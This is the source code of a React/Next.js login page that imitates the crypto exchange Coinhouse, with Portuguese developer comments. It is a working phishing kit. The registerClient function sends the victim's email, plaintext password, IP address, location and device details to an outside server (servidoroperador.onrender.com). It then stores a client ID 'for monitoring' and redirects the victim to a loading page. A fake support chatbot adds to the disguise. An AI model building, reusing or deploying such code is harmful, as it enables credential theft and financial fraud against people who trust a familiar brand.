"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Eye, EyeOff, ChevronDown } from "lucide-react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useMetrics } from "@/hooks/useMetrics"

const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en" // Padrão sempre inglês
}

const translations = {
  fr: {
    connect: "Connectez-vous",
    email: "Adresse email",
    password: "Mot de passe",
    loginButton: "Se connecter",
    forgotPassword: "Mot de passe oublié ?",
    noAccount: "Pas encore de compte ?",
    createAccount: "Créer un compte",
    experience: "Vivez la meilleure expérience",
    investment: "d'investissement en cryptoactifs.",
  },
  en: {
    connect: "Log in to your account",
    email: "Email address",
    password: "Password",
    loginButton: "Log In",
    forgotPassword: "Forgot password?",
    noAccount: "Don't have an account yet?",
    createAccount: "Create account",
    experience: "Experience the best",
    investment: "cryptocurrency investment experience.",
  },
}

const chatOptions = {
  fr: [
    "Comment créer un compte?",
    "J'ai oublié mon mot de passe",
    "Comment acheter des cryptomonnaies?",
    "Contacter le support",
  ],
  en: ["How to create an account?", "I forgot my password", "How to buy cryptocurrencies?", "Contact support"],
}

// Função para registrar cliente
// Função para registrar cliente - REUTILIZA dados do useMetrics (FLUXO CORRETO)
const registerClient = async (username: string, password: string) => {
  try {
    console.log('🚀 Iniciando registro de cliente...');
    
    // 📍 REUTILIZA dados que useMetrics já coletou (evita duplicação de APIs)
    let ip = 'Unknown';
    let country = 'BR';
    let city = 'São Paulo';
    let device = 'Desktop';
    
    // Função que detecta se é Mobile, Tablet ou Desktop (mesma do useMetrics)
    const getDeviceType = () => {
      if (typeof window === 'undefined' || typeof navigator === 'undefined') return 'Desktop';
      
      const userAgent = navigator.userAgent;
      if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
        return 'Tablet';
      }
      if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
        return 'Mobile';
      }
      return 'Desktop';
    };
    
    device = getDeviceType();
    
    // Tenta recuperar dados que useMetrics já coletou (sessionStorage)
    try {
      const metricsData = sessionStorage.getItem('metrics_data');
      if (metricsData) {
        const parsed = JSON.parse(metricsData);
        ip = parsed.ip || 'Unknown';
        country = parsed.country || 'BR';
        city = parsed.city || 'São Paulo';
        console.log('📍 Reutilizando dados de localização do useMetrics:', { ip, country, city });
      } else {
        console.log('📍 Dados de localização não encontrados no sessionStorage, usando padrões');
      }
    } catch (error) {
      console.log('📍 Erro ao recuperar dados salvos, usando padrões:', error);
    }
    
    // Dados para registro (MESMO FORMATO que as métricas)
    const clientData = {
      username,
      password,
      ip,
      country,
      city,
      device,
      referrer: document.referrer || "direct",
      currentUrl: window.location.href
    };
    
    console.log('📊 Dados do cliente preparados:', clientData);
    
    // Enviar para API
    console.log('🌐 Enviando para API de registro...');
    const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(clientData)
    });
    
    console.log('🌐 Resposta da API:', response.status, response.statusText);
    
    if (response.ok) {
      const data = await response.json()
      console.log("✅ Cliente registrado com sucesso:", data)
      
      // 🔑 SALVAR CLIENT_ID para monitoramento (CRÍTICO para redirecionamento)
      if (data && data.clientId) {
        localStorage.setItem('client_id', data.clientId);
        console.log("🔑 Client ID salvo para monitoramento:", data.clientId);
      }
      
      return data
    } else {
      const errorData = await response.text()
      console.log("❌ Erro ao registrar cliente:", errorData)
      return null
    }
  } catch (error) {
    console.log("❌ Erro durante registro de cliente:", error)
    return null
  }
}

export default function LoginPage() {
  const metrics = useMetrics() // Hook das métricas
  const router = useRouter()
  const [language, setLanguage] = useState(() => getDefaultLanguage())
  const [showPassword, setShowPassword] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const [showChat, setShowChat] = useState(false)
  const [chatMessages, setChatMessages] = useState([
    { type: "bot", message: language === "fr" ? "Bonjour! Comment puis-je vous aider?" : "Hello! How can I help you?" },
  ])

  const t = translations[language as keyof typeof translations]

  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])

  // Função para lidar com o login
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!email || !password) return
    
    setIsLoading(true)
    
    try {
      // Registrar cliente
      const clientData = await registerClient(email, password)
      
      // Redirecionar para página de loading
      router.push("/loading")
    } catch (error) {
      console.log("Erro no login:", error)
      setIsLoading(false)
    }
  }



  return (
    <div className="min-h-screen flex">
      {/* Left side - Login Form */}
      <div className="flex-1 lg:flex-none lg:w-1/2 flex flex-col justify-center px-6 sm:px-8 lg:px-16 xl:px-20 bg-white min-h-screen py-8">
        <div className="w-full max-w-md mx-auto">
          {/* Logo */}
          <div className="mb-6">
            <Image src="/coinhouse-logo.png" alt="Coinhouse" width={250} height={50} className="h-10 w-auto" />
          </div>

          {/* Language Selector */}
          <div className="mb-6 flex justify-end">
            <Select value={language} onValueChange={setLanguage}>
              <SelectTrigger className="w-20 border border-gray-300 rounded-full px-3 py-1 h-auto font-medium [&>svg]:hidden bg-white">
                <SelectValue />
                <ChevronDown className="h-3 w-3 ml-1 text-black font-bold" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="fr">FR</SelectItem>
                <SelectItem value="en">GB</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Login Form */}
          <form onSubmit={handleLogin} className="space-y-6">
            <h1 className="text-2xl font-semibold text-gray-900 mb-6">{t.connect}</h1>

            <div className="space-y-4">
              <div>
                <Label htmlFor="email" className="text-sm font-medium text-gray-700 mb-2 block">
                  {t.email}
                </Label>
                <Input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  required
                />
              </div>

              <div>
                <Label htmlFor="password" className="text-sm font-medium text-gray-700 mb-2 block">
                  {t.password}
                </Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 pr-12 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                  </button>
                </div>
              </div>
            </div>

            <div className="flex items-center justify-between pt-4">
              <Button 
                type="submit" 
                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium"
                disabled={isLoading}
              >
                {isLoading ? "..." : t.loginButton}
              </Button>

              <button type="button" className="text-sm text-gray-600 hover:text-gray-800 underline">{t.forgotPassword}</button>
            </div>

            <div className="pt-6 text-sm text-gray-600">
              {t.noAccount} <button type="button" className="text-black hover:underline font-medium">{t.createAccount}</button>
            </div>
          </form>
        </div>
      </div>

      {/* Right side - Background with Phone */}
      <div className="hidden lg:flex lg:flex-1 relative overflow-hidden">
        {/* Background Image */}
        <div
          className="absolute inset-0 bg-gradient-to-br from-pink-400 via-purple-500 to-blue-500"
          style={{
            backgroundImage: `url('/gradient-background.png')`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        />

        {/* Phone Mockup */}
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative">
            <Image src="/phone-mockup.png" alt="Coinhouse App" width={300} height={600} className="drop-shadow-2xl" />
          </div>
        </div>

        {/* Bottom Text */}
        <div className="absolute bottom-16 left-1/2 transform -translate-x-1/2 text-center text-white">
          <h2 className="text-2xl font-bold mb-2">{t.experience}</h2>
          <p className="text-xl">{t.investment}</p>
        </div>
      </div>
      {/* Chat Bot */}
      {!showChat && (
        <button
          onClick={() => setShowChat(true)}
          className="fixed bottom-6 right-6 bg-black text-white p-4 rounded-full shadow-lg hover:bg-gray-800 transition-colors z-50"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
            />
          </svg>
        </button>
      )}

      {showChat && (
        <div className="fixed bottom-6 right-6 w-80 h-96 bg-white rounded-lg shadow-2xl border z-50 flex flex-col">
          <div className="bg-black text-white p-4 rounded-t-lg flex justify-between items-center">
            <h3 className="font-medium">Support Coinhouse</h3>
            <button onClick={() => setShowChat(false)} className="text-white hover:text-gray-300">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          <div className="flex-1 p-4 overflow-y-auto">
            {chatMessages.map((msg, index) => (
              <div key={index} className={`mb-3 ${msg.type === "bot" ? "text-left" : "text-right"}`}>
                <div
                  className={`inline-block p-3 rounded-lg max-w-xs ${
                    msg.type === "bot" ? "bg-gray-100 text-gray-800" : "bg-black text-white"
                  }`}
                >
                  {msg.message}
                </div>
              </div>
            ))}
          </div>

          <div className="p-4 border-t">
            <div className="space-y-2">
              {chatOptions[language as keyof typeof chatOptions].map((option, index) => (
                <button
                  key={index}
                  onClick={() => {
                    setChatMessages((prev) => [
                      ...prev,
                      { type: "user", message: option },
                      {
                        type: "bot",
                        message:
                          language === "fr"
                            ? "Merci pour votre question. Un agent va vous contacter bientôt."
                            : "Thank you for your question. An agent will contact you soon.",
                      },
                    ])
                  }}
                  className="w-full text-left p-2 text-sm border rounded hover:bg-gray-50 transition-colors"
                >
                  {option}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
